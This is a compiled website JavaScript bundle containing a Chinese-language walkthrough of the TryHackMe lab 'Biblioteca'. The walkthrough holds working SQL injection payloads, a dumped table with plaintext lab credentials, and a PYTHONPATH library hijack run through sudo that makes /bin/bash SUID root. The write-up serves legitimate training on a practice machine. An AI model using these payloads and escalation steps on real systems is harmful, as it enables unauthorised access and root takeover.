"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[6022],{66576:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>r,toc:()=>c});var t=a(74848),i=a(28453);const s={sidebar_position:137,tags:["Easy","Linux","SQLI","Python PATH"],title:"Biblioteca",description:"Biblioteca",sidebar_label:"Biblioteca",slug:"/tryhackme/137"},o="Biblioteca",r={id:"box/TryHackMe/137",title:"Biblioteca",description:"Biblioteca",source:"@site/docs/box/TryHackMe/137.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/137",permalink:"/docs/tryhackme/137",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"Python PATH",permalink:"/docs/tags/python-path"}],version:"current",sidebarPosition:137,frontMatter:{sidebar_position:137,tags:["Easy","Linux","SQLI","Python PATH"],title:"Biblioteca",description:"Biblioteca",sidebar_label:"Biblioteca",slug:"/tryhackme/137"},sidebar:"boxSidebar",previous:{title:"broker",permalink:"/docs/tryhackme/136"},next:{title:"Templates",permalink:"/docs/tryhackme/138"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8000",id:"8000",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"smokey",id:"smokey",level:3},{value:"smokey \u2014&gt;hazel",id:"smokey-hazel",level:3},{value:"hazel \u2014&gt; root",id:"hazel--root",level:3}];function h(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"biblioteca",children:"Biblioteca"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-166-251:~/biblioteca# nmap -sTCV -p 22,8000 --min-rate 1000 10.10.119.87\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-04 05:08 BST\nNmap scan report for ip-10-10-119-87.eu-west-1.compute.internal (10.10.119.87)\nHost is up (0.000094s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)\n|_http-server-header: Werkzeug/2.0.2 Python/3.8.10\n|_http-title:  Login \nMAC Address: 02:1D:D3:84:80:9B (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(n.h2,{id:"8000",children:"8000"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-166-251:~/biblioteca# gobuster dir -u http://10.10.119.87:8000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.119.87:8000/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     txt,html\n[+] Timeout:        10s\n===============================================================\n2023/10/04 05:09:21 Starting gobuster\n===============================================================\n/login (Status: 200)\n/register (Status: 200)\n/logout (Status: 302)\n===============================================================\n2023/10/04 05:25:30 Finished\n===============================================================\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636e\u626b\u63cf\u7ed3\u679c\u6211\u8bbf\u95ee\u7f51\u9875\u5e76\u6ca1\u6709\u53d1\u73b0\u4efb\u4f55\u53ef\u4ee5\u5229\u7528\u7684\u5730\u65b9, \u56e0\u4e3a\u8fd9\u4e2a\u7f51\u7ad9\u53ea\u662f\u7b80\u5355\u7684\u767b\u9646, \u6240\u4ee5\u6211\u5c1d\u8bd5 SQLi \u5e76\u53d1\u73b0\u5b58\u5728\u6f0f\u6d1e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-166-251:~/biblioteca# sqlmap -r sql.txt --risk 3 --level 3\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: username=admin' AND 5487=5487-- SjLu&password=admin\n\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: username=admin' AND SLEEP(5)-- YtoB&password=admin\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: username=-9392' UNION ALL SELECT NULL,CONCAT(0x71716a6271,0x556d77534f5855517a68686265624b4141734a694c7a4c774449496c71566346766b54787a4d6151,0x7170626271),NULL,NULL-- vjAb&password=admin\n---\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u7528\u6237\u8868\u6211\u5f97\u5230\u4e86\u4e00\u4e2a\u8d26\u53f7"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"Database: website                                                                                                                                                       \nTable: users\n[2 entries]\n+----+-------------------+----------+----------------+\n| id | email             | username | password       |\n+----+-------------------+----------+----------------+\n| 1  | smokey@email.boop | smokey   | My_P@ssW0rd123 |\n| 2  | admin@qq.com      | admin    | admin          | # \u81ea\u5df1\u6ce8\u518c\u7684\n+----+-------------------+----------+----------------+\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5bf9\u4e8e smokey  \u8d26\u53f7\u6211\u767b\u9646\u7f51\u7ad9\u5e76\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u7279\u6b8a\u4e4b\u5904\u6240\u4ee5\u5c1d\u8bd5\u5229\u7528\u5176\u8fdb\u884c SSH \u767b\u9646"}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"smokey",children:"smokey"}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528\u5f97\u5230\u7684\u8d26\u53f7\u53d1\u73b0\u53ef\u4ee5\u767b\u5f55"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171018.png",alt:"image-20240709171017304"})}),"\n",(0,t.jsx)(n.h3,{id:"smokey-hazel",children:"smokey \u2014>hazel"}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u63d0\u793a\u544a\u8bc9\u6211\u5f31\u5bc6\u7801, \u6240\u4ee5\u76f4\u63a5\u5c06\u7528\u6237\u540d\u5f53\u4f5c\u5bc6\u7801\u53d1\u73b0\u53ef\u4ee5\u767b\u5f55"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171025.png",alt:"image-20240709171024304"})}),"\n",(0,t.jsx)(n.h3,{id:"hazel--root",children:"hazel \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u53d1\u73b0\u7528\u6237\u5177\u6709 SUDO \u7279\u6743\u53ef\u4ee5\u6267\u884c\u4e00\u4e2a Python\u811a\u672c\u540c\u65f6\u8fd8\u9700\u8981 SETENV  \u6743\u9650\u76f4\u63a5 Python PATH \u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'hazel@biblioteca:/home$ sudo -l\nMatching Defaults entries for hazel on biblioteca:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser hazel may run the following commands on biblioteca:\n    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py\nhazel@biblioteca:/home$ cd ~\nhazel@biblioteca:~$ ls\nhasher.py  user.txt\nhazel@biblioteca:~$ ls -al hasher.py \n-rw-r----- 1 root hazel 497 Dec  7  2021 hasher.py\nhazel@biblioteca:~$ cat hasher.py  | head -n 3\nimport hashlib\n\ndef hashing(passw):\nhazel@biblioteca:~$ cat << EOF > /tmp/hashlib.py\n> import os\n> os.system("chmod u+s /bin/bash")\n> EOF\nhazel@biblioteca:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py\n....\nhazel@biblioteca:~$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash\n'})})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(h,{...e})}):h(e)}},28453:(e,n,a)=>{a.d(n,{R:()=>o,x:()=>r});var t=a(96540);const i={},s=t.createContext(i);function o(e){const n=t.useContext(s);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),t.createElement(s.Provider,{value:n},e.children)}}}]);